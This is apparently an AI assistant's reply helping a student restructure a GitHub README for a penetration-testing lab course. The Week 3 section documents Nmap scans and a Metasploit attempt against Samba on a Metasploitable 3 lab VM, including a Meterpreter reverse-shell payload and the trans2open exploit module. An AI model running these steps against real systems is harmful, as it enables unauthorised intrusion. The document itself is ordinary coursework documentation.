Yes ✅ — that’s exactly the issue. Right now, your README.md file only contains Week 3, which is why when you open it, it starts straight from:

# Week 3 – Vulnerability Scanning and Exploitation (Metasploitable 3)

👉 Your screenshots for Week 1 and Week 2 are already uploaded into GitHub, but you never added their descriptions/sections into the README.

To fix this, you just need to manually paste Week 1 and Week 2 sections above Week 3 in the file you’re editing right now.

Here’s what to paste at the very top (before Week 3):

# Week 1 – IP Discovery and Reconnaissance

## Overview
This week introduced reconnaissance basics using Kali and Metasploitable.  
The objective was to identify the attacker (Kali) and target (Metasploitable) machine IPs.

## Steps and Evidence
### 🔍 1. Discover Target IP
Screenshot: Lab1_ip_discovery.png  
- Discovered the target machine IP using scanning tools.

### 🔍 2. Verify Kali IP
Screenshot: lab1_kali_ip.png  
- Verified the Kali machine IP.

### 🔍 3. Verify Metasploitable IP
Screenshot: lab1_metasploitable_ip_uname.png  
- Verified the Metasploitable machine IP.

---

# Week 2 – Network Scanning and Host Discovery

## Overview
This week focused on host discovery and reconnaissance.  
The objective was to scan the subnet, identify live hosts, and confirm connectivity.

## Steps and Evidence
### 🔍 1. Host Discovery
Screenshot: lab2-host-discovery.png  
- Ran discovery scan to find live hosts.

### 🔍 2. Network Reconnaissance
Screenshot: lab2-network-reconnaissance.png  
- Mapped the network and identified target systems.

### 🔍 3. Netdiscover Scan
Screenshot: week2_netdiscover.png  
- Used netdiscover to confirm devices on the subnet.

### 🔍 4. ARP and Ping Tests
Screenshot: week2_kali_arp.png  
Screenshot: week2_kali_ping.png  
Screenshot: week2_metasploitable.png  
- Verified connectivity with ARP and ping commands.

---

After pasting this, your README will look like this in order:
	•	Week 1
	•	Week 2
	•	Week 3

👉 Do you want me to also add Week 4 placeholder now (empty structure), so you won’t have to redo this later?

# Week 3 – Vulnerability Scanning and Exploitation (Metasploitable 3)

## Overview  
This week focused on performing *network reconnaissance* with Nmap and attempting *exploitation* with Metasploit against the Metasploitable 3 target machine. The objective was to identify open ports, detect services, enumerate vulnerabilities, and attempt to exploit Samba.

---

## Steps and Evidence  

### 🔍 1. Full Nmap Scan  
*Screenshot:* week3_scan1_nmap_full.png  
- Performed a full port scan on the target.  
- Identified open ports including *139* and *445 (SMB)*.  

---

### 🔍 2. Nmap Open Ports Scan  
*Screenshot:* week3_scan2_nmap_open_ports.png  
- Verified which ports were open and accessible.  
- Confirmed SMB-related ports.

---

### 🔍 3. Nmap Service Version Detection  
*Screenshot:* week3_scan3_nmap_service_versions.png  
- Ran -sV scan to identify service versions.  
- Found Samba service running on the target.

---

### 🔍 4. Nmap OS Detection  
*Screenshot:* week3_scan4_nmap_os_detection.png  
- Used -O option to detect the operating system.  
- Confirmed target OS type for exploitation attempts.  

---

### 🔍 5. Nmap Vulnerability Scan  
*Screenshot:* week3_scan5_nmap_vuln.png  
- Ran NSE vulnerability scripts on SMB.  
- Confirmed the service was potentially exploitable.  

---

### ⚡ 6. Starting Metasploit Framework  
*Screenshot:* week3_scan6_msfconsole.png  
- Opened msfconsole.  
- Prepared the exploitation phase.  

---

### ⚡ 7. Searching Samba Exploits in Metasploit  
*Screenshot:* week3_scan7_msf_search_samba.png  
- Used search samba command.  
- Listed multiple Samba exploits available in Metasploit.  

---

### ⚡ 8. Setting Target Host (RHOSTS)  
*Screenshot:* week3_scan9_msf_set_rhosts.png  
- Set the target machine IP:  
  ```bash
  set RHOSTS 172.28.128.3


⸻

⚡ 9. Setting Payload

Screenshot: week3_scan10_msf_set_payload.png
	•	Set the payload to establish a reverse shell:

set PAYLOAD linux/x86/meterpreter/reverse_tcp



⸻

⚡ 10. Setting Local Host (LHOST)

Screenshot: week3_scan11_msf_set_lhost.png
	•	Configured the attacker’s local IP for callback:

set LHOST 172.28.128.2



⸻

⚡ 11. Exploit Attempt

Screenshot: use_exploitlinuxsambatrans2open.png
	•	Used a Samba exploit module to attempt remote code execution.
	•	Exploit was launched, but no session was created (target did not open a shell).
	•	This shows that exploitation was attempted but unsuccessful in this configuration.

⸻

✅ Summary
	•	Successfully performed Nmap reconnaissance (ports, services, OS, vulnerabilities).
	•	Attempted Metasploit exploitation on Samba service.
	•	Exploit did not yield a session, but the lab demonstrated the process of moving from scanning → exploitation attempts.

---
 


